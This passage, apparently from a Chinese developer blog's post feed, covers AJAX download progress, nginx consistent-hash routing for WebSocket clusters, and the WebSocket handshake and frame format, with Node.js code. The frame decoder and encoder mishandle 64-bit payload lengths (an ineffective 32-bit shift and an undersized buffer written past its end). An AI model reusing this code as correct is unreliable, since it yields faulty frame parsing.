class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">&#x27;#GetFile&#x27;</span>).<span class="title function_">on</span>(<span class="string">&#x27;click&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">    $.<span class="title function_">ajax</span>({</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&#x27;https://kekek.cc/static/P60524-122812.jpg&#x27;</span>,</span><br><span class="line">        <span class="attr">xhr</span>: <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">            <span class="keyword">var</span> xhr = $.ajaxSettings.<span class="title function_">xhr</span>();</span><br><span class="line">            xhr.<span class="property">onprogress</span> = <span class="keyword">function</span> (<span class="params">e</span>) {</span><br><span class="line">                <span class="comment">// For downloads</span></span><br><span class="line">                <span class="keyword">if</span> (e.<span class="property">lengthComputable</span>) {</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">loaded</span> / e.<span class="property">total</span>);</span><br><span class="line">                }</span><br><span class="line">            };</span><br><span class="line">            xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = <span class="keyword">function</span> (<span class="params">e</span>) {</span><br><span class="line">                <span class="comment">// For uploads</span></span><br><span class="line">                <span class="keyword">if</span> (e.<span class="property">lengthComputable</span>) {</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">loaded</span> / e.<span class="property">total</span>);</span><br><span class="line">                }</span><br><span class="line">            };</span><br><span class="line">            <span class="keyword">return</span> xhr;</span><br><span class="line">        },</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">        <span class="attr">xhrFields</span>: {</span><br><span class="line">            <span class="attr">responseType</span>: <span class="string">&#x27;blob&#x27;</span></span><br><span class="line">        },</span><br><span class="line">        <span class="attr">success</span>: <span class="keyword">function</span> (<span class="params">data</span>) {</span><br><span class="line">            <span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            <span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(data);</span><br><span class="line">            a.<span class="property">href</span> = url;</span><br><span class="line">            a.<span class="property">download</span> = <span class="string">&#x27;P60524.jpg&#x27;</span>;</span><br><span class="line">            a.<span class="title function_">click</span>();</span><br><span class="line">            <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(url);</span><br><span class="line">        }</span><br><span class="line">    });</span><br><span class="line">});</span><br></pre></td></tr></table></figure><iframe src="https://kekek.cc/static/file-download-via-ajax.html" width="100%" height="80px" frameborder="0" loading="lazy" allowfullscreen></iframe><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://codepen.io/chrisdpratt/pen/RKxJNo">File Download via AJAX</a></li><li><a href="https://coderwall.com/p/je3uww/get-progress-of-an-ajax-request">Get progress of an AJAX request</a></li><li><a href="https://github.com/mozilla/send/blob/master/app/api.js#L140">Mozilla&#x2F;send</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> ajax </tag>
            
            <tag> download </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebSocket服务集群</title>
      <link href="/post/distributed-websocket.html"/>
      <url>/post/distributed-websocket.html</url>
      
        <content type="html"><![CDATA[<h2 id="WebSocket服务集群"><a href="#WebSocket服务集群" class="headerlink" title="WebSocket服务集群"></a>WebSocket服务集群</h2><p>网络套接字只能在内存中维护，多实例时就会遇到一个问题。如果A和B发消息，如果AB在一台机器。找到B的套接字就可以发送消息了，如果AB不在同一台机器就需要消息转发。我们要记录AB分别在哪台机器，当A要给B发消息时先查到B所在的机器，直接将此消息转发给B所在的机器，然后有它给B发消息。</p><p>如果消息大规模的需要内部转发，系统就会变得比较复杂并且因为有转发的过程效率将不会很高。我们应该尽可能的让要发消息的两个人尽量在一台机器，减少转发的几率。</p><p>一般情况下，我们会给要互发消息的用户维护一个虚拟的房间。例如A发消息给B时消息直接发给此房间，此房间将消息转发给B。</p><p>我们使用的WebSocket协议是在HTTP&#x2F;1.1协议上升级而成的，这里我们能拿到URL，如果将虚拟房间号添加到URL中。前置负载根据URL进行负载，那么我们就能将同一个房间的两个人分配到一台机器上。</p><p>这里面有一个问题，默认情况下我们将同一个房间的用户都会分派到一台机器。但是如果我们添加机器时原来的机器顺序就会被打乱，可能会将房间的新用户分配到另外一台机器。这时我们就需要<a href="/2017/10/16/consistent-hashing/">一致性Hash</a>，虽然是一致性Hash但是还是会有少数的用户被分配到其它服务器上去。但是现在已经大大减少内部消息转发，只有部分特别的情况下需要做少量消息的转发。</p><p><img src="/images/distributed-websocket.jpg"></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">map</span> <span class="variable">$http_upgrade</span> <span class="variable">$connection_upgrade</span> &#123;</span><br><span class="line">        <span class="attribute">default</span> upgrade;</span><br><span class="line">        &#x27;&#x27;      close;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">upstream</span> websocket &#123;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:8081</span>;</span><br><span class="line">        <span class="attribute">server</span> <span class="number">127.0.0.1:8082</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 一致性Hash</span></span><br><span class="line">        <span class="attribute">hash</span> <span class="variable">$request_uri</span> consistent;</span><br><span class="line">        <span class="comment"># hash_method crc32;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line">        <span class="attribute">listen</span>       <span class="number">8080</span>;</span><br><span class="line">        ...</span><br><span class="line">        <span class="section">location</span><span class="regexp"> ^~</span> /ws &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://websocket;</span><br><span class="line">            <span class="attribute">proxy_read_timeout</span> <span class="number">1d</span>;</span><br><span class="line"></span><br><span class="line">            <span class="attribute">proxy_http_version</span> <span class="number">1</span>.<span class="number">1</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Connection <span class="variable">$connection_upgrade</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://nginx.org/en/docs/http/websocket.html">WebSocket proxying</a></li><li><a href="http://nginx.org/en/docs/http/ngx_http_upstream_module.html#hash">Module ngx_http_upstream_module</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> websocket </tag>
            
            <tag> distributed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebSocket协议</title>
      <link href="/post/websocket.html"/>
      <url>/post/websocket.html</url>
      
        <content type="html"><![CDATA[<h2 id="WebSocket"><a href="#WebSocket" class="headerlink" title="WebSocket"></a>WebSocket</h2><p>HTTP是<code>请求响应</code>模型，在这个模型下服务器端是不能主动发消息给客户端的。这在很多场景下有诸多不便，例如消息通知等。为了解决这个问题，<code>WebSocket</code>应运而生。</p><p>在没有<code>WebSocket</code>之前，我们主要通过轮询来实现消息推送。为了提高消息的<code>实时性</code>我们要提高轮询频率，轮询频率提高后会给系统造成一些压力。</p><h3 id="协议实现"><a href="#协议实现" class="headerlink" title="协议实现"></a>协议实现</h3><p><img src="/images/websocket.jpg"><br>在浏览器中WebSocket通过HTTP的<a href="https://httpwg.org/specs/rfc7230.html#header.upgrade">协议升级</a>来实现。要发起 HTTP&#x2F;1.1 协议升级，客户端必须在请求头部中指定这两个字段：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Connection: Upgrade</span><br><span class="line">Upgrade: protocol-name[/protocol-version]</span><br></pre></td></tr></table></figure><p>如果服务端不同意升级或者不支持 Upgrade 所列出的协议，直接忽略即可（当成 HTTP&#x2F;1.1 请求，以 HTTP&#x2F;1.1 响应）；如果服务端同意升级，那么需要这样响应：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">Connection: upgrade</span><br><span class="line">Upgrade: protocol-name[/protocol-version]</span><br><span class="line"></span><br><span class="line">[... data defined by new protocol ...]</span><br></pre></td></tr></table></figure><p>协议完成升级后就和HTTP协议没有关系了，剩下的数据都以<code>WebSocket</code>协议进行传输。</p><p>下面是一个通过HTTP建立WebSocket请求的例子：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># 请求头</span><br><span class="line">GET ws://example.com/ HTTP/1.1</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: Upgrade</span><br><span class="line">Host: 127.0.0.1:8081</span><br><span class="line">Origin: http://example.com</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits</span><br><span class="line">Sec-WebSocket-Key: /3ZaE3COLK+dw4pHqCTarQ==</span><br><span class="line">Sec-WebSocket-Version: 13</span><br><span class="line">Upgrade: websocket</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36</span><br><span class="line"></span><br><span class="line"># 响应头</span><br><span class="line">HTTP/1.1 101 Switching Protocols</span><br><span class="line">connection: upgrade</span><br><span class="line">sec-websocket-accept: EMUWrlnRHG2LyGmmWMuWoFyBxnI=</span><br><span class="line">upgrade: websocket</span><br></pre></td></tr></table></figure><p>字段说明：</p><ul><li>Connection必须设置Upgrade，表示客户端希望连接升级。</li><li>Upgrade字段必须设置WebSocket，表示希望升级到WebSocket协议。</li><li>Sec-WebSocket-Key是随机的字符串，服务器端会用这些数据来构造出一个SHA-1的信息摘要。把<code>Sec-WebSocket-Key</code>加上一个特殊字符串<code>258EAFA5-E914-47DA-95CA-C5AB0DC85B11</code>，然后计算SHA-1摘要，之后进行BASE-64编码，将结果做为<code>Sec-WebSocket-Accept</code>头的值，返回给客户端。如此操作，可以尽量避免普通HTTP请求被误认为WebSocket协议。</li><li><code>Sec-WebSocket-Version</code> 表示支持的WebSocket版本。RFC6455要求使用的版本是13，之前草案的版本均应当弃用。</li><li>Origin字段是可选的，通常用来表示在浏览器中发起此WebSocket连接所在的页面，类似于Referer。但是，与Referer不同的是，Origin只包含了协议和主机名称。</li><li>其他一些定义在HTTP协议中的字段，如Cookie等，也可以在WebSocket中使用。</li></ul><h4 id="握手"><a href="#握手" class="headerlink" title="握手"></a>握手</h4><p>要使用WebSocket首先得让客户端和服务器建立连接，首先需要通过验证KEY来做握手工作。</p><p>这个握手协议使用的是HTTP格式的请求，并再头部分带上一个<code>Sec-WebSocket-Key</code>字段，服务器对这个字段加上一个特定的字符串后做一次sha1运算，然后把结果用Base64的形式以同样的方式发送回去就可以完成握手的工作了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ws-handshake.js</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> net = <span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">WS</span> = <span class="string">&#x27;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = net.<span class="title function_">createServer</span>(<span class="function">(<span class="params">conn</span>) =&gt;</span> &#123;</span><br><span class="line">    conn.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!conn.<span class="property">isWebSocket</span>) &#123;</span><br><span class="line">            <span class="comment">// 获取发送过来的KEY</span></span><br><span class="line">            <span class="keyword">let</span> secKey = data.<span class="title function_">toString</span>().<span class="title function_">match</span>(<span class="regexp">/Sec-WebSocket-Key: (.+)/i</span>)[<span class="number">1</span>];</span><br><span class="line">            <span class="comment">// 连接上WS这个字符串，并做一次sha1运算，最后转换成Base64</span></span><br><span class="line">            secKey = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha1&#x27;</span>).<span class="title function_">update</span>(secKey + <span class="variable constant_">WS</span>).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">            <span class="comment">// 输出返回给客户端的数据，这些字段都是必须的</span></span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">&#x27;HTTP/1.1 101 Switching Protocols\r\n&#x27;</span>);</span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">&#x27;Upgrade: websocket\r\n&#x27;</span>);</span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">&#x27;Connection: Upgrade\r\n&#x27;</span>);</span><br><span class="line">            <span class="comment">// 这个字段带上服务器处理后的KEY</span></span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">`Sec-WebSocket-Accept: <span class="subst">$&#123;secKey&#125;</span>\r\n`</span>);</span><br><span class="line">            <span class="comment">// 输出空行，使HTTP头结束</span></span><br><span class="line">            conn.<span class="title function_">write</span>(<span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line"></span><br><span class="line">            conn.<span class="property">isWebSocket</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(data.<span class="title function_">toString</span>(<span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="variable language_">console</span>.<span class="property">error</span>);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">8124</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;server bound&#x27;</span>));</span><br></pre></td></tr></table></figure><h4 id="解析数据帧"><a href="#解析数据帧" class="headerlink" title="解析数据帧"></a>解析数据帧</h4><p>WebSocket数据包不像HTML是纯文本形式的，它是一个二进制的协议包。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> 0                   1                   2                   3</span><br><span class="line"> 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1</span><br><span class="line">+-+-+-+-+-------+-+-------------+-------------------------------+</span><br><span class="line">|F|R|R|R| opcode|M| Payload len |    Extended payload length    |</span><br><span class="line">|I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |</span><br><span class="line">|N|V|V|V|       |S|             |   (if payload len==126/127)   |</span><br><span class="line">| |1|2|3|       |K|             |                               |</span><br><span class="line">+-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +</span><br><span class="line">|     Extended payload length continued, if payload len == 127  |</span><br><span class="line">+ - - - - - - - - - - - - - - - +-------------------------------+</span><br><span class="line">|                               |Masking-key, if MASK set to 1  |</span><br><span class="line">+-------------------------------+-------------------------------+</span><br><span class="line">| Masking-key (continued)       |          Payload Data         |</span><br><span class="line">+-------------------------------- - - - - - - - - - - - - - - - +</span><br><span class="line">:                     Payload Data continued ...                :</span><br><span class="line">+ - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - +</span><br><span class="line">|                     Payload Data continued ...                |</span><br><span class="line">+---------------------------------------------------------------+</span><br></pre></td></tr></table></figure><ul><li><p>FIN: 1 bit</p><p>  指示这个是消息的最后片段。第一个片段可能也是最后的片段。</p></li><li><p>RSV1, RSV2, RSV3: 1 bit each</p><p>  预留字段，默认为0。</p></li><li><p>Opcode: 4 bits</p><p>  表示数据的类型。</p><ul><li><p>%x0 denotes a continuation frame</p></li><li><p>%x1 denotes a text frame</p></li><li><p>%x2 denotes a binary frame</p></li><li><p>%x3-7 are reserved for further non-control frames</p></li><li><p>%x8 denotes a connection close</p></li><li><p>%x9 denotes a ping</p></li><li><p>%xA denotes a pong</p></li><li><p>%xB-F are reserved for further control frames</p></li></ul></li><li><p>Mask: 1 bit</p><p>  1位。</p><p>  标识这个数据帧的数据是否使用掩码，值为1表示使用掩码。从客户端发送的数据都为1。</p></li><li><p>Payload length: 7 bits, 7+16 bits, or 7+64 bits</p><p>  7位。表示数据的长度。</p><p>  PayloadLength只有7位，换成无符号整型的话只有0到127的取值，这么小的数值当然无法描述较大的数据，因此规定当数据长度小于或等于125时候它才作为数据长度的描述，如果这个值为126，则时候后面的两个字节（16位）来储存储存数据长度，如果为127则用后面八个字节（64位，最高有效位必须是0）来储存数据长度。</p></li><li><p>Masking-key: 0 or 4 bytes</p><p>  <code>Mask</code>的值为<code>1</code>时才有<code>Masking-key</code>。</p></li><li><p>Payload </p><p>  如果使用了掩码所有数据就需要和掩码做异或（^）运算。</p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">j                   = i MOD 4</span><br><span class="line">transformed-octet-i = original-octet-i XOR masking-key-octet-j</span><br></pre></td></tr></table></figure>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>, ret = []; i &lt; payload.<span class="property">length</span>; i++) ret.<span class="title function_">push</span>(payload[i] ^ <span class="title class_">MaskingKey</span>[i % <span class="number">4</span>]);</span><br></pre></td></tr></table></figure></li></ul><p>示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> ws = <span class="keyword">new</span> <span class="title class_">WebSocket</span>(<span class="string">&#x27;ws://example.com/&#x27;</span>);</span><br><span class="line">ws.<span class="title function_">send</span>(<span class="string">&#x27;ok&#x27;</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bits: 1000 0001 1 0000010 00101011-01101000-10101000-11100111 0100010000000011</span><br><span class="line"></span><br><span class="line">FIN                1 </span><br><span class="line">Opcode             0001</span><br><span class="line">Mask               1</span><br><span class="line">PayloadLength      0000010</span><br><span class="line">Masking-key        00101011-01101000-10101000-11100111</span><br><span class="line">Payload            0100010000000011</span><br></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">decodeWebSocketFrame</span>(<span class="params">msg</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> pos = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// 读取前16位（帧头）</span></span><br><span class="line">    <span class="keyword">let</span> header = msg.<span class="title function_">readUInt16BE</span>(pos);</span><br><span class="line">    pos += <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// 转为二进制</span></span><br><span class="line">    <span class="comment">// let headerBits = header.toString(2).padStart(16, &#x27;0&#x27;);</span></span><br><span class="line">    <span class="comment">// let fin = headerBits.slice(0, 1);</span></span><br><span class="line">    <span class="comment">// let opcode = headerBits.slice(4, 8);</span></span><br><span class="line">    <span class="comment">// let mask = headerBits.slice(8, 9);</span></span><br><span class="line">    <span class="comment">// let payloadLength = parseInt(headerBits.slice(9, 16), 2);</span></span><br><span class="line">    <span class="keyword">let</span> fin = header &gt;&gt; <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">let</span> opcode = (header &amp; <span class="number">0b0000111100000000</span>) &gt;&gt; <span class="number">8</span>;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>((header &amp; <span class="number">0b0000000010000000</span>).<span class="title function_">toString</span>(<span class="number">2</span>));</span><br><span class="line">    <span class="keyword">let</span> mask = (header &amp; <span class="number">0b0000000010000000</span>) &gt;&gt; <span class="number">7</span>;</span><br><span class="line">    <span class="keyword">let</span> payloadLength = header &amp; <span class="number">0b0000000001111111</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 127</span></span><br><span class="line">    <span class="keyword">if</span> (payloadLength === <span class="number">127</span>) &#123;</span><br><span class="line">        <span class="comment">// 最高有效位必须为0</span></span><br><span class="line">        <span class="comment">// 头32位补零到64位加后32位</span></span><br><span class="line">        <span class="comment">// let first32 = msg.readUInt32BE(pos) &amp; 0b01111111111111111111111111111111 &lt;&lt; 32;</span></span><br><span class="line">        <span class="keyword">let</span> first32 = msg.<span class="title function_">readUInt32BE</span>(pos) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">        pos += <span class="number">4</span>;</span><br><span class="line">        <span class="keyword">let</span> second32 = msg.<span class="title function_">readUInt32BE</span>(pos);</span><br><span class="line">        pos += <span class="number">4</span>;</span><br><span class="line">        payloadLength = first32 + second32;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (payloadLength === <span class="number">126</span>) &#123;</span><br><span class="line">        payloadLength = msg.<span class="title function_">readUInt16BE</span>(pos);</span><br><span class="line">        pos += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> maskingKey = [];</span><br><span class="line">    <span class="keyword">if</span> (mask === <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="comment">// 4位掩码</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">            maskingKey.<span class="title function_">push</span>(msg.<span class="title function_">readUInt8</span>(pos++));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> payload = msg.<span class="title function_">slice</span>(pos, pos + payloadLength);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; payloadLength; i++) &#123;</span><br><span class="line">        payload[i] = payload[i] ^ maskingKey[i % <span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// fin = 1 表示结束</span></span><br><span class="line">    <span class="keyword">if</span> (fin === <span class="number">1</span> &amp;&amp; opcode == <span class="number">0x1</span>) payload = payload.<span class="title function_">toString</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> &#123;</span><br><span class="line">        fin,</span><br><span class="line">        opcode,</span><br><span class="line">        mask,</span><br><span class="line">        payloadLength,</span><br><span class="line">        maskingKey,</span><br><span class="line">        payload</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="生成数据帧"><a href="#生成数据帧" class="headerlink" title="生成数据帧"></a>生成数据帧</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">encodeWebSocketFrame</span>(<span class="params">frame</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> data = [];</span><br><span class="line">    <span class="keyword">let</span> mask = <span class="number">0</span>; <span class="comment">// 不做掩码</span></span><br><span class="line">    <span class="keyword">let</span> payload = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(frame.<span class="property">payloadData</span>);</span><br><span class="line">    <span class="comment">// 16bits 2bytes</span></span><br><span class="line">    <span class="keyword">let</span> headerBuf = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">2</span>);</span><br><span class="line">    data.<span class="title function_">push</span>(headerBuf);</span><br><span class="line"></span><br><span class="line">    headerBuf.<span class="title function_">writeUInt8</span>(frame.<span class="property">fin</span> &lt;&lt; <span class="number">7</span> | frame.<span class="property">opcode</span>);</span><br><span class="line">    <span class="keyword">if</span> (payload.<span class="property">length</span> &gt; <span class="number">0xFFFF</span>) &#123;</span><br><span class="line">        headerBuf.<span class="title function_">writeUInt8</span>(mask &lt;&lt; <span class="number">7</span> | <span class="number">127</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> extendedPayloadLengthBuf = <span class="title class_">Buffer</span>.<span class="title function_">alloc</span>(<span class="number">4</span>);</span><br><span class="line">        data.<span class="title function_">push</span>(extendedPayloadLengthBuf);</span><br><span class="line">        <span class="comment">// 头32位</span></span><br><span class="line">        extendedPayloadLengthBuf.<span class="title function_">writeUInt32BE</span>(payload.<span class="property">length</span> &gt;&gt; <span class="number">32</span>);</span><br><span class="line">        <span class="comment">// 后32位</span></span><br><span class="line">        extendedPayloadLengthBuf.<span class="title function_">writeUInt32BE</span>(payload.<span class="property">length</span> &amp; <span class="number">0xFFFFFFFF</span>, <span class="number">2</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (payload.<span class="property">length</span> &gt; 